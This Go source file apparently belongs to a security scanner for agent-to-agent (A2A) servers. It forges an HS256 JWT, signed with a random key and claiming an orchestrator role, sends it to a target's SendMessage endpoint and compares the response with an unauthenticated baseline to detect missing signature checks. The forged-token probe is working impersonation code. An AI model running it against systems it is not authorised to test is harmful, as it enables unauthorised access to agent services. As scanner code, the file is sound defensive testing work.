package a2a

import (
	"context"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"
	"time"

	"github.com/calbebop/batesian/internal/attack"
)

// PeerImpersonationExecutor tests whether an A2A server validates the
// cryptographic signature of incoming bearer JWTs when accepting peer
// agent requests (rule a2a-peer-impersonation-001).
//
// Attack sequence:
//  1. Fetch /.well-known/agent-card.json to extract the agent name for use as
//     the JWT subject. Falls back to "trusted-orchestrator" if unavailable.
//  2. Build a forged HS256 JWT signed with a random key the server cannot know.
//     Claims: sub=<agent-name>, iss=legitimate-orchestrator.example.com,
//     role=orchestrator, aud=<target>.
//  3. Send a SendMessage request with the forged token in Authorization: Bearer.
//  4. Send a baseline SendMessage with no Authorization header.
//  5. Compare: forged accepted + baseline rejected => server trusts claims
//     without signature verification; both accepted => no auth enforced.
type PeerImpersonationExecutor struct {
	rule attack.RuleContext
}

// NewPeerImpersonationExecutor creates an executor for the a2a-peer-impersonation attack type.
func NewPeerImpersonationExecutor(r attack.RuleContext) *PeerImpersonationExecutor {
	return &PeerImpersonationExecutor{rule: r}
}

func (e *PeerImpersonationExecutor) Execute(ctx context.Context, target string, opts attack.Options) ([]attack.Finding, error) {
	vars := attack.NewVars(target, opts.OOBListenerURL)
	// Two clients: one with any configured token for card fetching, and one
	// explicitly without for the unauthenticated baseline probe (step 4).
	client := attack.NewHTTPClient(opts, vars)
	unauthClient := attack.NewUnauthHTTPClient(opts, vars)

	endpoint := vars.BaseURL + "/"

	// Step 1: Probe the agent card to find a plausible agent name to impersonate.
	agentName := "trusted-orchestrator"
	cardResp, err := client.GET(ctx, vars.BaseURL+"/.well-known/agent-card.json", nil)
	if err == nil && cardResp.IsSuccess() {
		var card struct {
			Name string `json:"name"`
		}
		if jsonErr := json.Unmarshal(cardResp.Body, &card); jsonErr == nil && card.Name != "" {
			agentName = card.Name
		}
	}

	// Step 2: Build the forged JWT using a random signing key.
	forgedToken, err := buildForgedJWT(agentName, target)
	if err != nil {
		return nil, fmt.Errorf("building forged JWT: %w", err)
	}

	msgBody := map[string]interface{}{
		"jsonrpc": "2.0",
		"id":      1,
		"method":  "SendMessage",
		"params": map[string]interface{}{
			"message": map[string]interface{}{
				"role":  1,
				"parts": []interface{}{map[string]string{"text": "ping"}},
			},
			"configuration": map[string]interface{}{},
		},
	}

	// Step 3: Forged-token probe.
	forgedHeaders := map[string]string{
		"A2A-Version":   "1.0",
		"Authorization": "Bearer " + forgedToken,
	}
	forgedResp, err := client.POST(ctx, endpoint, forgedHeaders, msgBody)
	if err != nil {
		return nil, nil
	}

	// Step 4: Unauthenticated baseline — use unauthClient so opts.Token is not injected.
	baselineResp, err := unauthClient.POST(ctx, endpoint, map[string]string{"A2A-Version": "1.0"}, msgBody)
	if err != nil {
		return nil, nil
	}

	forgedOK := forgedResp.IsSuccess() && !isJSONRPCError(forgedResp.Body)
	baselineOK := baselineResp.IsSuccess() && !isJSONRPCError(baselineResp.Body)
	baselineUnauth := baselineResp.StatusCode == 401 || baselineResp.StatusCode == 403

	var findings []attack.Finding

	switch {
	case forgedOK && baselineUnauth:
		// Forged JWT accepted, but no-auth request rejected: server reads claims
		// without verifying the signature against a known key.
		findings = append(findings, attack.Finding{
			RuleID:     e.rule.ID,
			RuleName:   e.rule.Name,
			Severity:   "high",
			Confidence: attack.ConfirmedExploit,
			Title:      "A2A server accepted forged peer agent JWT without signature validation",
			Description: fmt.Sprintf(
				"A forged HS256 JWT (sub=%q, iss=%q, role=orchestrator) signed with a random "+
					"key was accepted by the A2A server (HTTP %d), while an unauthenticated "+
					"baseline request was rejected (HTTP %d). The server is granting access based "+
					"on JWT claims alone without verifying the token signature.",
				agentName, "https://legitimate-orchestrator.example.com",
				forgedResp.StatusCode, baselineResp.StatusCode),
			Evidence: fmt.Sprintf(
				"Forged JWT (redacted): %s...[signature omitted]\nForged response: HTTP %d\nBaseline response: HTTP %d\n%s",
				jwtHeader(forgedToken), forgedResp.StatusCode, baselineResp.StatusCode,
				snippet(forgedResp.Body, 400)),
			Remediation: e.rule.Remediation,
			TargetURL:   endpoint,
		})

	case forgedOK && baselineOK:
		// Both accepted: the server does not enforce authentication at all.
		findings = append(findings, attack.Finding{
			RuleID:     e.rule.ID,
			RuleName:   e.rule.Name,
			Severity:   "medium",
			Confidence: attack.ConfirmedExploit,
			Title:      "A2A server accepts unauthenticated requests; peer impersonation possible",
			Description: fmt.Sprintf(
				"Both a forged JWT request (HTTP %d) and an unauthenticated baseline request "+
					"(HTTP %d) were accepted. The server does not enforce authentication, "+
					"making peer agent impersonation trivial for any caller.",
				forgedResp.StatusCode, baselineResp.StatusCode),
			Evidence: fmt.Sprintf(
				"Forged response: HTTP %d\nBaseline response: HTTP %d\n%s",
				forgedResp.StatusCode, baselineResp.StatusCode,
				snippet(forgedResp.Body, 400)),
			Remediation: e.rule.Remediation,
			TargetURL:   endpoint,
		})
	}

	return findings, nil
}

// buildForgedJWT constructs a HS256 JWT signed with a random key.
// It uses only stdlib: encoding/base64, encoding/json, crypto/hmac, crypto/sha256, crypto/rand.
func buildForgedJWT(sub, aud string) (string, error) {
	headerJSON, err := json.Marshal(map[string]string{
		"alg": "HS256",
		"typ": "JWT",
	})
	if err != nil {
		return "", err
	}

	now := time.Now().Unix()
	payloadJSON, err := json.Marshal(map[string]interface{}{
		"sub":  sub,
		"iss":  "https://legitimate-orchestrator.example.com",
		"aud":  aud,
		"role": "orchestrator",
		"iat":  now,
		"exp":  now + 3600,
	})
	if err != nil {
		return "", err
	}

	headerEnc := base64.RawURLEncoding.EncodeToString(headerJSON)
	payloadEnc := base64.RawURLEncoding.EncodeToString(payloadJSON)
	signingInput := headerEnc + "." + payloadEnc

	// Use a fresh random key -- the server cannot know it, so a valid server
	// must reject the token. A server that accepts it trusts unsigned claims.
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		return "", fmt.Errorf("generating random JWT key: %w", err)
	}

	mac := hmac.New(sha256.New, key)
	_, _ = mac.Write([]byte(signingInput))
	sig := mac.Sum(nil)

	return signingInput + "." + base64.RawURLEncoding.EncodeToString(sig), nil
}

// jwtHeader returns the header.payload portion of a JWT (the first two segments)
// for safe inclusion in evidence without leaking the signature or full token value.
func jwtHeader(token string) string {
	parts := strings.SplitN(token, ".", 3)
	if len(parts) >= 2 {
		return parts[0] + "." + parts[1]
	}
	return "[invalid-token]"
}
